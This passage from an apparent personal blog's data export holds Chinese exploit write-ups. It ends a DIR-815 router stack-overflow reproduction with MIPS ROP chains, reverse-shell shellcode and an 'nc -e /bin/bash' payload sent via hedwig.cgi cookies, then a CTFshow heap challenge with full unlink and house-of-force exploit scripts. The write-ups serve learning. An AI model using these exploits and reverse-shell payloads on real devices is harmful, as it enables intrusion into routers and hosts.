class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x436D0</span>) <span class=\"comment\"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x56BD0</span>) <span class=\"comment\"># s3  sleep</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">5</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x57E50</span>) <span class=\"comment\"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x37E6C</span>) <span class=\"comment\"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x3B974</span>) <span class=\"comment\"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">shellcode = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0x1111</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    not $a1, $t4</span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4183</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    andi $a0, $v0, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class=\"line\"><span class=\"string\">    ori $a1, 0xFF01</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $a1, 0x0101</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFEF</span></span><br><span class=\"line\"><span class=\"string\">    not $a2, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4170</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6962</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, $t0,0x2f2f</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -20($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6873</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, 0x2f6e</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -16($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a3, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addi $a0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    addi $t0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addiu $sp, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">fd = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;payload&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>)</span><br><span class=\"line\">fd.write(payload)</span><br><span class=\"line\">fd.close()</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"通过http报文\"><a href=\"#通过http报文\" class=\"headerlink\" title=\"通过http报文\"></a>通过http报文</h3><h4 id=\"ROP链-1\"><a href=\"#ROP链-1\" class=\"headerlink\" title=\"ROP链\"></a>ROP链</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">cmd = <span class=\"string\">b&#x27;nc -e /bin/bash 192.168.225.128 8888&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x53200</span> - <span class=\"number\">1</span>) <span class=\"comment\"># s0  system_addr - 1</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x169C4</span>) <span class=\"comment\"># s1  addiu $s2, $sp, 0x18 (=&gt; jalr $s0)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">7</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x32A98</span>) <span class=\"comment\"># ra  addiu $s0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += cmd</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.225.129:1234/hedwig.cgi&quot;</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;winmt&quot;</span> : <span class=\"string\">&quot;pwner&quot;</span>&#125;</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Cookie&quot;</span>        : <span class=\"string\">b&quot;uid=&quot;</span> + payload,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>  : <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Length&quot;</span>: <span class=\"string\">&quot;11&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">res = requests.post(url = url, headers = headers, data = data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ROP链-shellcode\"><a href=\"#ROP链-shellcode\" class=\"headerlink\" title=\"ROP链+shellcode\"></a>ROP链+shellcode</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>, arch = <span class=\"string\">&#x27;mips&#x27;</span>, log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = <span class=\"number\">0x77f34000</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x3cd</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x436D0</span>) <span class=\"comment\"># s1  move $t9, $s3 (=&gt; lw... =&gt; jalr $t9)</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">4</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x56BD0</span>) <span class=\"comment\"># s3  sleep</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">5</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x57E50</span>) <span class=\"comment\"># ra  li $a0, 1 (=&gt; jalr $s1)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">4</span>*<span class=\"number\">4</span>)</span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x37E6C</span>) <span class=\"comment\"># s4  move  $t9, $a1 (=&gt; jalr $t9)</span></span><br><span class=\"line\">payload += p32(libc_base + <span class=\"number\">0x3B974</span>) <span class=\"comment\"># ra  addiu $a1, $sp, 0x18 (=&gt; jalr $s4)</span></span><br><span class=\"line\"> </span><br><span class=\"line\">shellcode = asm(<span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a0, $zero, 0x1111</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4006</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFFD</span></span><br><span class=\"line\"><span class=\"string\">    not $a0, $t4</span></span><br><span class=\"line\"><span class=\"string\">    not $a1, $t4</span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4183</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    andi $a0, $v0, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4041</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $a1, 0xB821 # Port: 8888</span></span><br><span class=\"line\"><span class=\"string\">    ori $a1, 0xFF01</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $a1, 0x0101</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $a1, 0x83C0A8C0 # IP: 192.168.192.131</span></span><br><span class=\"line\"><span class=\"string\">    sw $a1, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    li $t4, 0xFFFFFFEF</span></span><br><span class=\"line\"><span class=\"string\">    not $a2, $t4</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4170</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6962</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, $t0,0x2f2f</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -20($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    lui $t0, 0x6873</span></span><br><span class=\"line\"><span class=\"string\">    ori $t0, 0x2f6e</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -16($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a3, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -12($sp)</span></span><br><span class=\"line\"><span class=\"string\">    sw $a3, -4($sp)</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addi $a0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    addi $t0, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\">    sw $t0, -8($sp)</span></span><br><span class=\"line\"><span class=\"string\">    addi $a1, $sp, -8</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    addiu $sp, $sp, -20</span></span><br><span class=\"line\"><span class=\"string\"> </span></span><br><span class=\"line\"><span class=\"string\">    slti $a2, $zero, 0xFFFF</span></span><br><span class=\"line\"><span class=\"string\">    li $v0, 4011</span></span><br><span class=\"line\"><span class=\"string\">    syscall 0x42424</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">payload += <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x18</span></span><br><span class=\"line\">payload += shellcode</span><br><span class=\"line\"> </span><br><span class=\"line\">url = <span class=\"string\">&quot;http://192.168.192.133:1234/hedwig.cgi&quot;</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">&quot;winmt&quot;</span> : <span class=\"string\">&quot;pwner&quot;</span>&#125;</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;Cookie&quot;</span>        : <span class=\"string\">b&quot;uid=&quot;</span> + payload,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Type&quot;</span>  : <span class=\"string\">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;Content-Length&quot;</span>: <span class=\"string\">&quot;11&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">res = requests.post(url = url, headers = headers, data = data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(res)</span><br></pre></td></tr></table></figure>\n\n<p>我在这里并没有把4个exp 都打完，我只打了发报文的纯ROP链。shellcode 的exp，懒得改ip 地址了</p>\n<h2 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h2><p><a href=\"https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3\">[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>\n"},{"title":"CTFshow pwn143","cover":"/img/紫发.png","_content":"\n# CTFshow pwn143 (unlink & houce of force)\n\n## ida分析\n\n### main函数分析\n![1741875084264.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e78e7977a.png)\n1.经典菜单题\n2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数\n\n### add函数分析\n![1741875249112.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e832e7df2.png)\n1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小\n2.使用heaplist数组，保存堆块的地址\n\n### edit函数分析\n![1741875438296.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e8f044392.png)\n1.发现溢出漏洞，可以溢出多字节\n\n### show函数分析\n![1741875684508.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e9e693af7.png)\n1.没什么特别的，就是可以用来泄露libc\n\n### delete函数分析\n![1741875887777.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2eab191a39.png)\n1.没有漏洞，释放后将指针置空了\n\n## 构造思路\n1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。\n2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针\n![1741876735944.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2ee0282c68.png)\n3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。\n4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。\n\n## exp\n### unlink\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28159\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n\nflag=0x400D7F\nadd(0x60,b'aaaa') #0\nadd(0x90,b'bbbb') #1\nadd(0x80,b'cccc') #2\nadd(0x20,b'/bin/sh\\x00') #3\nptr=0x6020a8\nfd=ptr-0x18\nbk=ptr-0x10\nfake_chunk=p64(0)+p64(0x61)\nfake_chunk+=p64(fd)+p64(bk)\nfake_chunk+=p64(0)*8\nfake_chunk+=p64(0x60)+p64(0xa0)\n\nedit(0,len(fake_chunk),fake_chunk)\n#gdb.attach(io)\ndelete(1)\npayload=p64(0)+p64(0)+p64(0x90)+p64(elf.got['free'])\nedit(0,len(payload),payload)\n#gdb.attach(io)\nshow()\nio.recv(4)\nfree=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success(\"free-{}\".format(hex(free)))\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump(\"free\")\nsystem=libcbase+libc.dump(\"system\")\ngdb.attach(io)\nedit(0,0x8,p64(system))\ndelete(3)\nio.interactive()\n```\n### house of force\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28197\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\ndef get_flag():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"5\")\nflag=0x400D7F\nadd(0x30,b'aaaa')\npayload=p64(0)*7+p64(0xffffffffffffffff)\n\nedit(0,0x41,payload)\n\noffset=-0x70\nadd(offset,b'aaaa')\n#gdb.attach(io)\nadd(0x10,p64(flag)*2)\nget_flag()\nio.interactive()\n```","source":"_posts/heap/CTFshow pwn143.md","raw":"---\ntitle: CTFshow pwn143\ntags:\n  - pwn\n  - unlink\ncategories:\n  - 做题笔记\ncover: /img/紫发.png\n---\n\n# CTFshow pwn143 (unlink & houce of force)\n\n## ida分析\n\n### main函数分析\n![1741875084264.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e78e7977a.png)\n1.经典菜单题\n2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数\n\n### add函数分析\n![1741875249112.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e832e7df2.png)\n1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小\n2.使用heaplist数组，保存堆块的地址\n\n### edit函数分析\n![1741875438296.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e8f044392.png)\n1.发现溢出漏洞，可以溢出多字节\n\n### show函数分析\n![1741875684508.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e9e693af7.png)\n1.没什么特别的，就是可以用来泄露libc\n\n### delete函数分析\n![1741875887777.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2eab191a39.png)\n1.没有漏洞，释放后将指针置空了\n\n## 构造思路\n1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin 